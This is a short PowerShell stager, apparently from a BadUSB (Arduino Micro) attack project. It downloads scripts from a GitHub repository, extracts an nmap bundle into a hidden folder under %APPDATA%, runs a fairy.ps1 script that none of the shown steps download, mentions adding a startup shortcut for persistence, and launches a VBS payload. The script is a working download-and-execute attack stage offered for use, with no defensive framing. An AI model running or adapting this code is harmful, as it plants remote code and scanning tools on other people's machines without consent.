# download run
Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.ps1 -OutFile run.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile run.vbs


# download and extract nmap
Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip
Expand-Archive -LiteralPath "./nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force; ./fairy.ps1

# could add shortcut to startup here

# run run.vbs for the first time
./run.vbs
